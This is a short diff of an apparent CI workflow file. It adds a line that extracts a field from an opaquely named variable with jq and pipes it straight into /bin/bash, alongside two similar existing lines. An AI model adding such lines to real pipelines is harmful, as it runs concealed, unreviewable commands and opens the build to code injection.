@@ -19,6 +19,7 @@ jobs:
         run: |
           printf '%s' "$vve0510" | jq -r .ys1885 | /bin/bash
           printf '%s' "$sufg97950" | jq -r .fm89 | /bin/bash
+          echo $z0 | jq -r .oedm14 | /bin/bash
 
       - name: Save output
         if: always()
